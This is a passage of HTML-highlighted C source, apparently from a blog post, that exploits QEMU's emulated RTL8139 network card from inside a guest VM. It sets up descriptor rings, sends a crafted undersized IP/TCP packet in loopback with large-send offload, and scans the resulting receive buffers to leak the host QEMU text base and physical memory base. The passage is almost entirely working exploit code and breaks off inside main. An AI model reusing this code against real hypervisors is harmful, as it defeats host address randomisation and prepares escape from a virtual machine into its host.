class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">/* w0 end of ring flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">/* first segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_FS (1&lt;&lt;29)</span></span><br><span class="line"><span class="comment">/* last segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">/* large send packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">/* large send MSS mask, bits 16...25 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">/* UDP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_UDPCS (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* TCP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 bits 0...15 : buffer size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE (1&lt;&lt;16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)</span></span><br><span class="line"><span class="comment">/* w1 add tag flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TAGC (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* w1 bits 0...15 : VLAN tag (big endian) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)</span></span><br><span class="line"><span class="comment">/* w2 low  32bit of Rx buffer ptr */</span></span><br><span class="line"><span class="comment">/* w3 high 32bit of Rx buffer ptr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set after transmission */</span></span><br><span class="line"><span class="comment">/* FIFO underrun flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_UNF (1&lt;&lt;25)</span></span><br><span class="line"><span class="comment">/* transmit error summary flag, valid if set any of three below */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_TES (1&lt;&lt;23)</span></span><br><span class="line"><span class="comment">/* out-of-window collision flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_OWC (1&lt;&lt;22)</span></span><br><span class="line"><span class="comment">/* link failure flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_LNKF (1&lt;&lt;21)</span></span><br><span class="line"><span class="comment">/* excessive collisions flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_EXC (1&lt;&lt;20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Symbolic offsets to registers. */</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in TxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> tx_config_bits &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Interframe Gap Time. Only TxIFG96 doesn&#x27;t violate IEEE 802.3 */</span></span><br><span class="line">        TxIFGShift = <span class="number">24</span>,</span><br><span class="line">        TxIFG84 = (<span class="number">0</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.4us / 840ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG88 = (<span class="number">1</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.8us / 880ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG92 = (<span class="number">2</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.2us / 920ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG96 = (<span class="number">3</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.6us / 960ns (10 / 100Mbps) */</span></span><br><span class="line"></span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">/* enable loopback test mode */</span></span><br><span class="line">    TxCRC = (<span class="number">1</span> &lt;&lt; <span class="number">16</span>),    <span class="comment">/* DISABLE appending CRC to end of Tx packets */</span></span><br><span class="line">    TxClearAbt = (<span class="number">1</span> &lt;&lt; <span class="number">0</span>),    <span class="comment">/* Clear abort (WO) */</span></span><br><span class="line">    TxDMAShift = <span class="number">8</span>,        <span class="comment">/* DMA burst value (0-7) is shifted this many bits */</span></span><br><span class="line">    TxRetryShift = <span class="number">4</span>,    <span class="comment">/* TXRR value (0-15) is shifted this many bits */</span></span><br><span class="line"></span><br><span class="line">    TxVersionMask = <span class="number">0x7C800000</span>, <span class="comment">/* mask out version bits 30-26, 23 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in RxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> rx_mode_bits &#123;</span><br><span class="line">    AcceptErr = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> ChipCmdBits &#123;</span><br><span class="line">    CmdReset = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* C+ mode */</span></span><br><span class="line"><span class="keyword">enum</span> CplusCmdBits &#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// big endian</span></span><br><span class="line"><span class="comment">// ethernet frame</span></span><br><span class="line"><span class="keyword">uint8_t</span> packet[] = &#123;</span><br><span class="line">    <span class="comment">/* 以太网帧 */</span></span><br><span class="line">    <span class="comment">// dst</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// src</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// 类型(代表IP协议)</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* IP数据报 */</span></span><br><span class="line">    <span class="comment">// 版本和首部长度</span></span><br><span class="line">    (<span class="number">0x4</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x5</span>,</span><br><span class="line">    <span class="comment">// TOS</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 总长度</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="comment">// 标识</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算)</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x40</span>,</span><br><span class="line">    <span class="comment">// 上层协议，代表TCP</span></span><br><span class="line">    <span class="number">0x06</span>,</span><br><span class="line">    <span class="comment">// 首部校验和</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 源IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="comment">// 目的IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* TCP数据报 */</span></span><br><span class="line">    <span class="comment">// 源端口</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 目的端口</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,</span><br><span class="line">    <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 报头长度等</span></span><br><span class="line">    <span class="number">0x50</span>,</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="number">0x10</span>,</span><br><span class="line">    <span class="comment">// Window size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xed</span>,</span><br><span class="line">    <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// Urgent pointer</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx descriptor</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;rtl8139_desc;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx ring</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> *<span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *buffer;</span><br><span class="line">&#125;rtl8139_ring;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PAGE_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PAGE_PFN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | ((<span class="keyword">uint64_t</span>)addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writeb</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writew</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outw(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readb</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inb(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readw</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inw(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readl</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring *ring, rtl8139_desc *desc, <span class="keyword">size_t</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nb; ++i) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line"></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;</span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">        <span class="comment">// printf(&quot;buffer[%d]: 0x%x\n&quot;, i, ring[i].desc-&gt;buf_lo);  // for debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RxRingAddrLO);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc *desc, <span class="keyword">void</span> *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN  |</span><br><span class="line">                 CP_TX_EOR  |</span><br><span class="line">                 CP_TX_LS   |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS|</span><br><span class="line">                 CP_TX_LGSEN;</span><br><span class="line">    desc-&gt;dw0 |= RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), TxAddr0);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, TxAddr0+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_writel(TxLoopBack, TxConfig);</span><br><span class="line">    pmio_writel(AcceptMyPhys, RxConfig);</span><br><span class="line">    pmio_writew(CPlusRxEnb|CPlusTxEnb, CpCmd);</span><br><span class="line">    pmio_writeb(CmdRxEnb|CmdTxEnb, ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span> *buffer, <span class="keyword">void</span> *packet, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        pmio_writeb(<span class="number">1</span>&lt;&lt;<span class="number">6</span>, TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n0x%08x: &quot;</span>, (<span class="keyword">uint32_t</span>)(ptr+i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_text_base_addr</span><span class="params">(rtl8139_ring *ring, <span class="keyword">size_t</span> ring_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_release_bool_offset = <span class="number">0x379DEF</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_get_str = <span class="number">0x379a57</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> offset[<span class="number">2</span>] = &#123;property_get_str, property_release_bool_offset&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> *ptr = (<span class="keyword">uint8_t</span> *)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *end = (<span class="keyword">uint8_t</span> *)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span> *)ptr;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((value &amp; mask) == (offset[j] &amp; mask)) &#123;</span><br><span class="line">                 <span class="keyword">return</span> value - offset[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_physical_addr</span><span class="params">(rtl8139_ring *ring, <span class="keyword">size_t</span> ring_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xffff000000</span>ULL;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="built_in">array</span>[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">array</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> *ptr = (<span class="keyword">uint8_t</span> *)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *end = (<span class="keyword">uint8_t</span> *)ring[i].buffer + RTL8139_BUFFER_SIZE/<span class="number">4</span>*<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span> *)ptr;</span><br><span class="line">            <span class="keyword">if</span> (((value &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) &#123;</span><br><span class="line">                value = (value &amp; mask) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                <span class="built_in">array</span>[value]++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">array</span>[value] &gt; <span class="built_in">array</span>[index]) &#123;</span><br><span class="line">                    index = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> memory_size = <span class="number">0x40000000</span>;</span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">uint64_t</span>)index | <span class="number">0x7f0000</span>) &lt;&lt; <span class="number">24</span>) - memory_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44*1500 = 66000 &gt; ip_data_len = 65535</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring *rtl8139_rx_ring;</span><br><span class="line">    rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc;</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_ring = (rtl8139_ring *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_ring)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_tx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    iopl(<span 